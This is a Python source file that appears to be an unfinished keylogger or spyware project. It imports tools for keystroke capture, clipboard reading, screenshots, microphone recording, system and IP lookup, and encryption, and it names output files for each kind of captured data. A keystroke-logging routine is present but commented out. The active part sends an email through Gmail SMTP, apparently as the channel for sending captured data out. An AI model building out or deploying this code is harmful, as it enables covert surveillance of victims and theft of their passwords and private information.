# Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import clipboard # Using clipboard instead of win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# Variables

system_information = "system.txt"
audio_information = "audio.wav"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"
keys_information = "key_log.txt"

system_information_enc = 'enc_system.txt'
clipboard_information_enc = 'enc_clipboard.txt'
keys_information_enc = 'enc_keys_logged.txt'

# Keyboard Logging
'''
def on_press_func(key):
    try:
        if(key == Key.shift_r):
            listener.stop()
        else:
            f.write(key.char)
    except AttributeError:
        f.write('(' + str(key) + ')')


f = open(keys_information, 'a')

with Listener(
        on_press=on_press_func) as listener:
    listener.join()

f.close()
'''
# Email

sender_email = os.environ['SENDER_EMAIL']
sender_emails_pwd = os.environ['SENDER_EMAIL_PWD']
receiver_email = os.environ['RECEIVER_EMAIL']

smtp_session = smtplib.SMTP('smtp.gmail.com', 587)
smtp_session.starttls()
smtp_session.login(sender_email, sender_emails_pwd)
message = "Testing3 to see if I can send emails through Python"
smtp_session.sendmail(sender_email, receiver_email, message)
smtp_session.quit()